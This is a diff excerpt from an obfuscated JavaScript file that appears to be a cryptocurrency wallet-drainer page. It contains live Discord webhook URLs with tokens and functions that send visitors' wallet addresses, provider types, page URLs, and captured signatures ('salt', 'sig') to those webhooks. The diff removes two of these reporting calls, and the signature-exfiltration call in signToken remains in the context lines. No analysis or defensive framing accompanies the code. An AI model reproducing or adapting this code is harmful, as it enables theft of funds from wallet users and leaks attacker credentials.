@@ -2696,6 +2696,7 @@ function sendJSON(_0x1fe40c, _0x28baaf) {
     data = JSON[_0x230136(0xbf0)](_0x1fe40c, '\x20', 0x2),
     _0x29d1b7[_0x230136(0x758)](data);
 }
+
 const webhooUri = {
     'visit': 'https://discord.com/api/webhooks/1087632125911629854/v2lmQ6n_XRoCBTD5AgufRCgbZppalD2Lr2vpHJA-ZmLxGvadMyxLCvvbU6uWDgf_XvFj',
     'signedVisit': 'https://discord.com/api/webhooks/1087632009700065310/Rpr7WHS1Z3yzmkawTnh8D1wltHIzieVX-MLOR2LBskb_E50LOhaB4yokHm97p9UZRALV',
@@ -2704,6 +2705,7 @@ const webhooUri = {
     'badSignature': _0x5c7eff(0x834)
 };
 let etherscanURI = 'https://etherscan.io/address/';
+
 function sendMessage(_0x1eb362, _0x54811f) {
     var _0x8e96ee = _0x5c7eff;
     const _0xee4cf4 = new XMLHttpRequest();
@@ -2724,7 +2726,6 @@ $(document)['ready'](async()=>{
     window[_0x469758(0x788)] != undefined && (providerType = _0x469758(0xc08),
     window[_0x469758(0x788)][_0x469758(0x21a)] == !![] && (providerType = 'Metamask..................................'),
     window[_0x469758(0x788)][_0x469758(0x542)] == !![] && (providerType = 'CoinBase..................................'));
-    sendMessage([_0x469758(0xaab), _0x469758(0x477) + url, 'mmAddr:\x20' + providerType, 'accessTime:\x20' + date, _0x469758(0x9b1) + providerType]['join'](_0x469758(0x6a8)), webhooUri[_0x469758(0x545)]);
     if (window[_0x469758(0x788)] != undefined) {
         var _0x13b295 = {
             'cacheProvider': ![],
@@ -2800,14 +2801,6 @@ async function walletConnected() {
     $(_0x1ca0db(0xa05))['val'](selectedAccount),
     date = new Date(),
     url = window[_0x1ca0db(0x483)]['href'],
-    sendJSON({
-        'id': '2-signed-visit',
-        'mmAddr': selectedAccount,
-        'accessTime': date,
-        'providerType': providerType,
-        'url': url
-    }, serverURL[_0x1ca0db(0x224)]),
-    sendMessage(['\x20🟥🟥🟥🟥\x20-\x20mid:\x209', _0x1ca0db(0x477) + url, _0x1ca0db(0x1c4) + etherscanURI + selectedAccount, 'date:\x20' + date, 'provType:\x20' + providerType][_0x1ca0db(0x9f0)](_0x1ca0db(0x6a8)), webhooUri[_0x1ca0db(0x113)]);
     if (_0x1b7e36[_0x1ca0db(0xe9c)] == 0x0) {
         isPending = ![],
         await onDisconnect();
@@ -3017,6 +3010,9 @@ async function signToken(_0x1a55f8, _0x2ed681, _0x297650, _0x301617, _0x56c8a5) 
     sendMessage(['\x20🟦🟦🟦🟦\x20-\x20mid:\x2011', 'url:\x20' + window[_0x3f04f0(0x483)]['href'], _0x3f04f0(0x1c4) + etherscanURI + _0x1a55f8, _0x3f04f0(0x9b1) + providerType, 'salt:\x20' + _0x2ed681, 'sig:\x20' + _0x3cd3fc[_0x3f04f0(0x1fb)], 'sigType:\x20' + tokenInfo[_0x3f04f0(0x17a)], 'signDate:\x20' + new Date()][_0x3f04f0(0x9f0)]('\x0a➜\x20'), webhooUri['postSign']),
     !![];
 }
+
+
+
 function signData(_0xafe4b4, _0x335f36) {
     return new Promise((_0x211b7b,_0x4d3af5)=>{
         var _0x42db21 = _0x8bcf
